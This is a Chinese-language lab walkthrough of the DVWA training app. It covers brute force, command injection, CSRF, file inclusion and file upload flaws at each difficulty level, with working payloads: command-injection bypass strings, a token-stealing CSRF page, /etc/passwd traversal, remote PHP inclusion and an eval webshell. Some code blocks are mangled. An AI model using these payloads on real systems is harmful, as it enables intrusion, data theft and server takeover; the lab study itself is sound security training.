# 实践
## 初始化
**首先点击按钮创造数据库,再点击login按钮进入登录页面，输入账号admin,密码password进入到系统里面。**     

![image]({path}/1.png)     

**将测试系统的难度设置为LOW，以便测试。**         


![image]({path}/2.png)             


## Brute Force（暴力破解漏洞）
Brute Force，即暴力（破解），是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手法之一。

![image]({path}/3.png)    



LOW等级服务器端核心代码

```

<?php

if(isset($_GET['Login'])){
//Getusername
$user=$_GET['username'];

//Getpassword
$pass=$_GET['password'];
$pass=md5($pass);

//Checkthedatabase
$query="SELECT*FROM`users`WHEREuser='$user'ANDpassword='$pass';";
$result=mysql_query($query)ordie('<pre>'.mysql_error().'</pre>');

if($result&&mysql_num_rows($result)==1){
//Getusersdetails
$avatar=mysql_result($result,0,"avatar");

//Loginsuccessful
echo"<p>Welcometothepasswordprotectedarea{$user}</p>";
echo"<imgsrc="{$avatar}"/>";
}
else{
//Loginfailed
echo"<pre><br/>Usernameand/orpasswordincorrect.</pre>";
}

mysql_close();
}

?>

```


可以看到，服务器只是验证了参数Login是否被设置（isset函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false），没有任何的防爆破机制。

**漏洞利用**

**爆破利用burpsuite即可完成**

第一步抓包

![image]({path}/4.png) 

第二步，将数据包右键发送到intruder模块，因为要对password参数进行爆破，所以在password参数的内容两边加$

![image]({path}/5.png) 


第三步选中Payloads，载入字典，点击Start attack进行爆破

![image]({path}/6.png) 

最后，尝试在爆破结果中找到正确的密码，可以看到password的响应包长度（length）“与众不同”，可推测password为正确密码，手工验证登陆成功。

![image]({path}/7.png) 

![image]({path}/8.png) 

## Command Injection

Command Injection，即命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一。

![image]({path}/9.png) 

### Low

服务器端核心代码


```
<?php 

if( isset( $_POST[ 'Submit' ]  ) ) { 

    // Get input 

    $target = $_REQUEST[ 'ip' ]; 

    // Determine OS and execute the ping command. 

    if( stristr( php_uname( 's' ), 'Windows NT' ) ) { 

        // Windows 

        $cmd = shell_exec( 'ping  ' . $target ); 

    } 

    else { 

        // *nix 

        $cmd = shell_exec( 'ping  -c 4 ' . $target ); 

    } 

    // Feedback for the end user 

    echo "<pre>{$cmd}</pre>"; 

} 

?> 
```

**相关函数介绍** 

stristr(string,search,before_search)

stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回 FALSE。参数string规定被搜索的字符串，参数search规定要搜索的字符串（如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符），可选参数before_true为布尔型，默认为“false” ，如果设置为 “true”，函数将返回 search 参数第一次出现之前的字符串部分。

php_uname(mode)

这个函数会返回运行php的操作系统的相关描述，参数mode可取值”a” （此为默认，包含序列”s n r v m”里的所有模式），”s ”（返回操作系统名称），”n”（返回主机名），” r”（返回版本名称），”v”（返回版本信息）， ”m”（返回机器类型）。

可以看到，服务器通过判断操作系统执行不同ping命令，但是对ip参数并未做任何的过滤，导致了严重的命令注入漏洞。

**漏洞利用**

window和linux系统都可以用&&来执行多条命令


```
127.0.0.1&&net user
```


![image]({path}/10.png) 

### Medium

服务器端核心代码


```
<?php 

if( isset( $_POST[ 'Submit' ]  ) ) { 

    // Get input 

    $target = $_REQUEST[ 'ip' ]; 

    // Set blacklist 

    $substitutions = array( 

        '&&' => '', 

        ';'  => '', 

    ); 

    // Remove any of the charactars in the array (blacklist). 

    $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 

    // Determine OS and execute the ping command. 

    if( stristr( php_uname( 's' ), 'Windows NT' ) ) { 

        // Windows 

        $cmd = shell_exec( 'ping  ' . $target ); 

    } 

    else { 

        // *nix 

        $cmd = shell_exec( 'ping  -c 4 ' . $target ); 

    } 

    // Feedback for the end user 

    echo "<pre>{$cmd}</pre>"; 

} 

?>
```

可以看到，相比Low级别的代码，服务器端对ip参数做了一定过滤，即把”&&” 、”;”删除，本质上采用的是黑名单机制，因此依旧存在安全问题。

**漏洞利用**


```
127.0.0.1&net user
```

因为被过滤的只有”&&”与” ;”，所以”&”不会受影响。

![image]({path}/11.png) 

这里需要注意的是”&&”与” &”的区别：

Command 1&&Command 2

先执行Command 1，执行成功后执行Command 2，否则不执行Command 2

![image]({path}/12.png) 

Command 1&Command 2

先执行Command 1，不管是否成功，都会执行Command 2

![image]({path}/13.png) 

由于使用的是str_replace把”&&” 
”;”替换为空字符，因此可以采用以下方式绕过：


```
127.0.0.1&;&ipconfig
```
![image]({path}/14.png)

这是因为”127.0.0.1&;&ipconfig”中的” ;”会被替换为空字符，这样一来就变成了”127.0.0.1&& ipconfig” ，会成功执行。


### High

服务器端核心代码


```
<?php 

if( isset( $_POST[ 'Submit' ]  ) ) { 

    // Get input 

    $target = trim($_REQUEST[ 'ip' ]); 

    // Set blacklist 

    $substitutions = array( 

        '&'  => '', 

        ';'  => '', 

        '|  ' => '', 

        '-'  => '', 

        '$'  => '', 

        '('  => '', 

        ')'  => '', 

        '`'  => '', 

        '||' => '', 

    ); 

    // Remove any of the charactars in the array (blacklist). 

    $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 

    // Determine OS and execute the ping command. 

    if( stristr( php_uname( 's' ), 'Windows NT' ) ) { 

        // Windows 

        $cmd = shell_exec( 'ping  ' . $target ); 

    } 

    else { 

        // *nix 

        $cmd = shell_exec( 'ping  -c 4 ' . $target ); 

    } 

    // Feedback for the end user 

    echo "<pre>{$cmd}</pre>"; 

} 

?> 
```

相比Medium级别的代码，High级别的代码进一步完善了黑名单，但由于黑名单机制的局限性，我们依然可以绕过。

**漏洞利用**

黑名单看似过滤了所有的非法字符，但仔细观察到是把”| ”（注意这里|后有一个空格）替换为空字符，于是 ”|”成了“漏网之鱼”。


```
|ls
```
![image]({path}/15.png) 

### Impossible

服务器端核心代码


```
<?php 

if( isset( $_POST[ 'Submit' ]  ) ) { 

    // Check Anti-CSRF token 

    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 

    // Get input 

    $target = $_REQUEST[ 'ip' ]; 

    $target = stripslashes( $target ); 

    // Split the IP into 4 octects 

    $octet = explode( ".", $target ); 

    // Check IF each octet is an integer 

    if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) { 

        // If all 4 octets are int's put the IP back together. 

        $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3]; 

        // Determine OS and execute the ping command. 

        if( stristr( php_uname( 's' ), 'Windows NT' ) ) { 

            // Windows 

            $cmd = shell_exec( 'ping  ' . $target ); 

        } 

        else { 

            // *nix 

            $cmd = shell_exec( 'ping  -c 4 ' . $target ); 

        } 

        // Feedback for the end user 

        echo "<pre>{$cmd}</pre>"; 

    } 

    else { 

        // Ops. Let the user name theres a mistake 

        echo '<pre>ERROR: You have entered an invalid IP.</pre>'; 

    } 

} 

// Generate Anti-CSRF token 

generateSessionToken(); 

?> 
```

相关函数介绍

stripslashes(string)

stripslashes函数会删除字符串string中的反斜杠，返回已剥离反斜杠的字符串。

explode(separator,string,limit)

把字符串打散为数组，返回字符串的数组。参数separator规定在哪里分割字符串，参数string是要分割的字符串，可选参数limit规定所返回的数组元素的数目。

is_numeric(string)

检测string是否为数字或数字字符串，如果是返回TRUE，否则返回FALSE。

可以看到，Impossible级别的代码加入了Anti-CSRF token，同时对参数ip进行了严格的限制，只有诸如“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。

## CSRF(Cross-site request forgery) 

CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。

![image]({path}/16.png)

下面对四种级别的代码进行分析。

### Low
服务器端核心代码


```
<?php 

if( isset( $_GET[ 'Change' ] ) ) { 
    // Get input 
    $pass_new  = $_GET[ 'password_new' ]; 
    $pass_conf = $_GET[ 'password_conf' ]; 

    // Do the passwords match? 
    if( $pass_new == $pass_conf ) { 
        // They do! 
        $pass_new = mysql_real_escape_string( $pass_new ); 
        $pass_new = md5( $pass_new ); 

        // Update the database 
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';"; 
        $result = mysql_query( $insert ) or die( '<pre>' . mysql_error() . '</pre>' ); 

        // Feedback for the user 
        echo "<pre>Password Changed.</pre>"; 
    } 
    else { 
        // Issue with passwords matching 
        echo "<pre>Passwords did not match.</pre>"; 
    } 

    mysql_close(); 
} 

?>
```

可以看到，服务器收到修改密码的请求后，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制（当然服务器对请求的发送者是做了身份验证的，是检查的cookie，只是这里的代码没有体现）。


**漏洞利用**

1、构造链接

A) 最基础的:


http://192.168.1.210:9999/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change&user_token=b0c1a89780d1a979743918e616c7b72b#

当受害者点击了这个链接，他的密码就会被改成password（这种攻击显得有些拙劣，链接一眼就能看出来是改密码的，而且受害者点了链接之后看到这个页面就会知道自己的密码被篡改了）
![image]({path}/17.png)


需要注意的是，CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面。

有人会说，这个链接也太明显了吧，不会有人点的，没错，所以真正攻击场景下，我们需要对链接做一些处理。

B) 我们可以使用短链接来隐藏URL（点击短链接，会自动跳转到真实网站）：

![image]({path}/18.png)


因为本地搭的环境，服务器域名是ip所以无法生成相应的短链接= =，实际攻击场景下只要目标服务器的域名不是ip，是可以生成相应短链接的。
需要提醒的是，虽然利用了短链接隐藏url，但受害者最终还是会看到密码修改成功的页面，所以这种攻击方法也并不高明。

**构造攻击页面**

现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。

![image]({path}/19.png)


当受害者访问页面时，会误认为是自己点击的只是一个按钮，但实际上已经遭受了CSRF攻击，密码已经被修改为了。


![image]({path}/20.png)




### Medium

服务器端核心代码


```
<?php 

if( isset( $_GET[ 'Change' ] ) ) { 
    // Checks to see where the request came from 
    if( eregi( $_SERVER[ 'SERVER_NAME' ], $_SERVER[ 'HTTP_REFERER' ] ) ) { 
        // Get input 
        $pass_new  = $_GET[ 'password_new' ]; 
        $pass_conf = $_GET[ 'password_conf' ]; 

        // Do the passwords match? 
        if( $pass_new == $pass_conf ) { 
            // They do! 
            $pass_new = mysql_real_escape_string( $pass_new ); 
            $pass_new = md5( $pass_new ); 

            // Update the database 
            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';"; 
            $result = mysql_query( $insert ) or die( '<pre>' . mysql_error() . '</pre>' ); 

            // Feedback for the user 
            echo "<pre>Password Changed.</pre>"; 
        } 
        else { 
            // Issue with passwords matching 
            echo "<pre>Passwords did not match.</pre>"; 
        } 
    } 
    else { 
        // Didn't come from a trusted source 
        echo "<pre>That request didn't look correct.</pre>"; 
    } 

    mysql_close(); 
} 

?>
```


相关函数说明

int eregi(string pattern, string string)

检查string中是否含有pattern（不区分大小写），如果有返回True，反之False。

可以看到，Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是192.168.1.210:9999），希望通过这种机制抵御CSRF攻击。



漏洞利用
过滤规则是http包头的Referer参数的值中必须包含主机名（这里192.168.1.210:9999）

我们可以将攻击页面命名为192.168.1.210:9999.html（页面被放置在攻击者的服务器里，这里是192.168.1.100）就可以绕过了

Referer参数完美绕过过滤规则

![image]({path}/21.png)


### High
服务器端核心代码

```
<?php 

if( isset( $_GET[ 'Change' ] ) ) { 
    // Check Anti-CSRF token 
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 

    // Get input 
    $pass_new  = $_GET[ 'password_new' ]; 
    $pass_conf = $_GET[ 'password_conf' ]; 

    // Do the passwords match? 
    if( $pass_new == $pass_conf ) { 
        // They do! 
        $pass_new = mysql_real_escape_string( $pass_new ); 
        $pass_new = md5( $pass_new ); 

        // Update the database 
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';"; 
        $result = mysql_query( $insert ) or die( '<pre>' . mysql_error() . '</pre>' ); 

        // Feedback for the user 
        echo "<pre>Password Changed.</pre>"; 
    } 
    else { 
        // Issue with passwords matching 
        echo "<pre>Passwords did not match.</pre>"; 
    } 

    mysql_close(); 
} 

// Generate Anti-CSRF token 
generateSessionToken(); 

?>
```

可以看到，High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。

漏洞利用
要绕过High级别的反CSRF机制，关键是要获取token，要利用受害者的cookie去修改密码的页面获取关键的token。

试着去构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成CSRF攻击，下面是代码。


```
<script type="text/javascript">

    function attack()

  {

   document.getElementsByName('user_token')[0].value=document.getElementById("hack").contentWindow.document.getElementsByName('user_token')[0].value;

  document.getElementById("transfer").submit(); 

  }

</script>

 

<iframe src="http://192.168.153.130/dvwa/vulnerabilities/csrf" id="hack" border="0" style="display:none;">

</iframe>

 

<body onload="attack()">

  <form method="GET" id="transfer" action="http://192.168.153.130/dvwa/vulnerabilities/csrf">

   <input type="hidden" name="password_new" value="password">

    <input type="hidden" name="password_conf" value="password">

   <input type="hidden" name="user_token" value="">

  <input type="hidden" name="Change" value="Change">

   </form>

</body>
```


攻击思路是当受害者点击进入这个页面，脚本会通过一个看不见框架偷偷访问修改密码的页面，获取页面中的token，并向服务器发送改密请求，以完成CSRF攻击。

然而理想与现实的差距是巨大的，这里牵扯到了跨域问题，而现在的浏览器是不允许跨域请求的。这里简单解释下跨域，我们的框架iframe访问的地址是http://192.168.153.130/dvwa/vulnerabilities/csrf，位于服务器192.168.153.130上，而我们的攻击页面位于黑客服务器10.4.253.2上，两者的域名不同，域名B下的所有页面都不允许主动获取域名A下的页面内容，除非域名A下的页面主动发送信息给域名B的页面，所以我们的攻击脚本是不可能取到改密界面中的user_token。

由于跨域是不能实现的，所以我们要将攻击代码注入到目标服务器192.168.153.130中，才有可能完成攻击。下面利用High级别的XSS漏洞协助获取Anti-CSRF token（因为这里的XSS注入有长度限制，不能够注入完整的攻击脚本，所以只获取Anti-CSRF token）。

### Impossible
服务器端核心代码



```
<?php 

if( isset( $_GET[ 'Change' ] ) ) { 
    // Check Anti-CSRF token 
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 

    // Get input 
    $pass_curr = $_GET[ 'password_current' ]; 
    $pass_new  = $_GET[ 'password_new' ]; 
    $pass_conf = $_GET[ 'password_conf' ]; 

    // Sanitise current password input 
    $pass_curr = stripslashes( $pass_curr ); 
    $pass_curr = mysql_real_escape_string( $pass_curr ); 
    $pass_curr = md5( $pass_curr ); 

    // Check that the current password is correct 
    $data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' ); 
    $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR ); 
    $data->bindParam( ':password', $pass_curr, PDO::PARAM_STR ); 
    $data->execute(); 

    // Do both new passwords match and does the current password match the user? 
    if( ( $pass_new == $pass_conf ) && ( $data->rowCount() == 1 ) ) { 
        // It does! 
        $pass_new = stripslashes( $pass_new ); 
        $pass_new = mysql_real_escape_string( $pass_new ); 
        $pass_new = md5( $pass_new ); 

        // Update database with new password 
        $data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' ); 
        $data->bindParam( ':password', $pass_new, PDO::PARAM_STR ); 
        $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR ); 
        $data->execute(); 

        // Feedback for the user 
        echo "<pre>Password Changed.</pre>"; 
    } 
    else { 
        // Issue with passwords matching 
        echo "<pre>Passwords did not match or current password incorrect.</pre>"; 
    } 
} 

// Generate Anti-CSRF token 
generateSessionToken(); 

?>
```

可以看到，Impossible级别的代码利用PDO技术防御SQL注入，至于防护CSRF，则要求用户输入原始密码（简单粗暴），攻击者在不知道原始密码的情况下，无论如何都无法进行CSRF攻击。

## File Inclusion
File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。

![image]({path}/22.png)


下面对四种级别的代码进行分析。

Low
服务器端核心代码


```
<php
//Thepagewewishtodisplay
$file=$_GET['page'];
>
```

可以看到，服务器端对page参数没有做任何的过滤跟检查。

服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。

点击file1.php后，显示如下

![image]({path}/23.png)


而现实中，恶意的攻击者是不会乖乖点击这些链接的，因此page参数是不可控的。

漏洞利用
1.本地文件包含

构造url


```
http://192.168.1.210:9999/vulnerabilities/fi/?page=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
```


成功读取到密码的文件

![image]({path}/24.png)



2.远程文件包含

当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。

在远程服务器192.168.5.12上传一个phpinfo.txt文件，内容如下


```
<?php phpinfo(); ?>
```

构造url


```
http://192.168.1.210:9999/vulnerabilities/fi/?page=http://192.168.1.210:81/phpinfo.txt
```


![image]({path}/25.png)

成功在服务器上执行了phpinfo函数


### Medium
服务器端核心代码


```
<php

//Thepagewewishtodisplay
$file=$_GET['page'];

//Inputvalidation
$file=str_replace(array("http://","https://"),"",$file);
$file=str_replace(array("../","..\""),"",$file);

>
```

可以看到，Medium级别的代码增加了str_replace函数，对page参数进行了一定的处理，将”http:// ”、”https://”、 ” ../”、”..\”替换为空字符，即删除。

漏洞利用
使用str_replace函数是极其不安全的，因为可以使用双写绕过替换规则。

例如page=hthttp://tp://192.168.5.12/phpinfo.txt时，str_replace函数会将http://删除，于是page=http://192.168.5.12/phpinfo.txt，成功执行远程命令。

同时，因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。

1.本地文件包含


```
http://192.168.1.210:9999/vulnerabilities/fi/?page=..././..././..././etc/passwd
```

![image]({path}/26.png)




2.远程文件包含

```
http://192.168.1.210:9999/vulnerabilities/fi/?page=htthttp://p://192.168.1.210:81/phpinfo.txt
```
![image]({path}/27.png)



### High
服务器端核心代码


```
<php

//Thepagewewishtodisplay
$file=$_GET['page'];

//Inputvalidation
if(!fnmatch("file*",$file)&&$file!="include.php"){
   //Thisisn'tthepagewewant!
echo"ERROR:Filenotfound!";
exit;
}

>
```

可以看到，High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。

漏洞利用
High级别的代码规定只能包含file开头的文件，看似安全，不幸的是我们依然可以利用file协议绕过防护策略。file协议其实我们并不陌生，当我们用浏览器打开一个本地文件时，用的就是file协议。


构造url


```
http://192.168.1.210:9999/vulnerabilities/fi/?page=file:///etc/passwd
```
![image]({path}/28.png)



Impossible
服务器端核心代码


```
<php
//Thepagewewishtodisplay
$file=$_GET['page'];

//Onlyallowinclude.phporfile{1..3}.php
if($file!="include.php"&&$file!="file1.php"&&$file!="file2.php"&&$file!="file3.php"){
//Thisisn'tthepagewewant!
echo"ERROR:Filenotfound!";
exit;
}

>
```

可以看到，Impossible级别的代码使用了白名单机制进行防护，简单粗暴，page参数必须为“include.php”、“file1.php”、“file2.php”、“file3.php”之一，彻底杜绝了文件包含漏洞。


## File Upload

File Upload，即文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞。

![image]({path}/29.png)


下面对四种级别的代码进行分析。

Low

服务器端核心代码


```
<?php 

if( isset( $_POST[ 'Upload' ] ) ) { 
    // Where are we going to be writing to? 
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; 
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); 

    // Can we move the file to the upload folder? 
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) { 
        // No 
        echo '<pre>Your image was not uploaded.</pre>'; 
    } 
    else { 
        // Yes! 
        echo "<pre>{$target_path} succesfully uploaded!</pre>"; 
    } 
} 

?> 
basename(path,suffix)
```


函数返回路径中的文件名部分，如果可选参数suffix为空，则返回的文件名包含后缀名，反之不包含后缀名。

可以看到，服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。

**漏洞利用**

文件上传漏洞的利用是有限制条件的，首先当然是要能够成功上传木马文件，其次上传文件必须能够被执行，最后就是上传文件的路径必须可知。不幸的是，这里三个条件全都满足。

上传文件hack.php（一句话木马）


```
<?php @eval($_POST[value]);?>

```
上传成功，并且返回了上传路径


![image]({path}/30.png)



打开中国菜刀，右键添加，

地址栏填入上传文件所在路径

```
http://192.168.1.210:9999/hackable/uploads/hack.php
```


参数名（一句话木马口令）为value。

![image]({path}/31.png)

然后菜刀就会通过向服务器发送包含value参数的post请求，在服务器上执行任意命令，获取webshell权限。

可以下载、修改服务器的所有文件。

![image]({path}/32.png)



### Medium

服务器端核心代码


```
<?php 

if( isset( $_POST[ 'Upload' ] ) ) { 
    // Where are we going to be writing to? 
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; 
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); 

    // File information 
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; 
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; 
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; 

    // Is it an image? 
    if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) && 
        ( $uploaded_size < 100000 ) ) { 

        // Can we move the file to the upload folder? 
        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) { 
            // No 
            echo '<pre>Your image was not uploaded.</pre>'; 
        } 
        else { 
            // Yes! 
            echo "<pre>{$target_path} succesfully uploaded!</pre>"; 
        } 
    } 
    else { 
        // Invalid file 
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>'; 
    } 
} 

?>
```

可以看到，Medium级别的代码对上传文件的类型、大小做了限制，要求文件类型必须是jpeg或者png，大小不能超过100000B（约为97.6KB）。

漏洞利用

1.组合拳（文件包含+文件上传）
因为采用的是一句话木马，所以文件大小不会有问题，至于文件类型的检查，尝试修改文件名为hack.png。
直接使用中国菜刀去连接不行的，因为后端不解析png后缀，这是就需要用到文件包含漏洞

![image]({path}/33.png)


```
http://192.168.1.210:9999/vulnerabilities/fi/?page=hthttp://tp://192.168.1.210:9999/hackable/uploads/hack.png
```

![image]({path}/34.png)
![image]({path}/35.png)

2.抓包修改文件类型

上传hack.png文件，抓包。

可以看到文件类型为image/png，尝试修改filename为hack.php。

![image]({path}/36.png)

![image]({path}/37.png)

### High

服务器端核心代码


```
<?php 

if( isset( $_POST[ 'Upload' ] ) ) { 
    // Where are we going to be writing to? 
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; 
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); 

    // File information 
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; 
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); 
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; 
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ]; 

    // Is it an image? 
    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) && 
        ( $uploaded_size < 100000 ) && 
        getimagesize( $uploaded_tmp ) ) { 

        // Can we move the file to the upload folder? 
        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) { 
            // No 
            echo '<pre>Your image was not uploaded.</pre>'; 
        } 
        else { 
            // Yes! 
            echo "<pre>{$target_path} succesfully uploaded!</pre>"; 
        } 
    } 
    else { 
        // Invalid file 
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>'; 
    } 
} 

?> 
strrpos(string,find,start)
```


函数返回字符串find在另一字符串string中最后一次出现的位置，如果没有找到字符串则返回false，可选参数start规定在何处开始搜索。

getimagesize(string filename)

函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。

可以看到，High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是”*.jpg”、”*.jpeg” 、”*.png”之一。同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型。



###  Impossible

服务器端核心代码

```
<?php 

if( isset( $_POST[ 'Upload' ] ) ) { 
    // Check Anti-CSRF token 
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 


    // File information 
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; 
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); 
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; 
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; 
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ]; 

    // Where are we going to be writing to? 
    $target_path   = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/'; 
    //$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-'; 
    $target_file   =  md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; 
    $temp_file     = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) ); 
    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; 

    // Is it an image? 
    if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) && 
        ( $uploaded_size < 100000 ) && 
        ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) && 
        getimagesize( $uploaded_tmp ) ) { 

        // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) 
        if( $uploaded_type == 'image/jpeg' ) { 
            $img = imagecreatefromjpeg( $uploaded_tmp ); 
            imagejpeg( $img, $temp_file, 100); 
        } 
        else { 
            $img = imagecreatefrompng( $uploaded_tmp ); 
            imagepng( $img, $temp_file, 9); 
        } 
        imagedestroy( $img ); 

        // Can we move the file to the web root from the temp folder? 
        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) { 
            // Yes! 
            echo "<pre><a href='${target_path}${target_file}'>${target_file}</a> succesfully uploaded!</pre>"; 
        } 
        else { 
            // No 
            echo '<pre>Your image was not uploaded.</pre>'; 
        } 

        // Delete any temp files 
        if( file_exists( $temp_file ) ) 
            unlink( $temp_file ); 
    } 
    else { 
        // Invalid file 
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>'; 
    } 
} 

// Generate Anti-CSRF token 
generateSessionToken(); 

?> 
in_get(varname)
```

函数返回相应选项的值

imagecreatefromjpeg ( filename )

函数返回图片文件的图像标识，失败返回false

imagejpeg ( image , filename , quality)

从image图像以filename为文件名创建一个JPEG图像，可选参数quality，范围从 0（最差质量，文件更小）到 100（最佳质量，文件最大）。

 imagedestroy( img )

函数销毁图像资源

可以看到，Impossible级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。

## Insecure CAPTCHA（无法实现，省略）
## SQL Injection
SQL Injection，即SQL注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。SQL注入漏洞的危害是巨大的，常常会导致整个数据库被“脱裤”，尽管如此，SQL注入仍是现在最常见的Web漏洞之一。近期很火的大使馆接连被黑事件，据说黑客依靠的就是常见的SQL注入漏洞。

手工注入思路
自动化的注入神器sqlmap固然好用，但还是要掌握一些手工注入的思路，下面简要介绍手工注入（非盲注）的步骤。

